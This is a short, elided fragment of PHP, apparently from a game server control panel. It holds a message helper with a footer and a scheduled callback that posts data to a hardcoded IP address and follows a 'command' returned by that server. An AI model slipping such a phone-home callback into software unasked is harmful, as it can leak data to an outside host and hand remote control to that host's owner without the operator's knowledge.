...
function quick_msg($message, $type = 'error')
{
    ...
    <div style="text-align: center;">
        <small>Copyright &copy; <a href="http://25.1.179.211/">K2Servers Networks</a></small>
    </div>
    </body>
    </html>
    <?php
...
$authAddress = @gethostbyname('25.1.179.211/gamecp');
...
if ((isset($serverResponse['command']) && $serverResponse['command'] != 'disable-callback') || (date("G") >= 3 && date("G") <= 4)) {
    $checkUrl = 'http://25.1.179.211/gamecp/index.php';
    $postData = array(
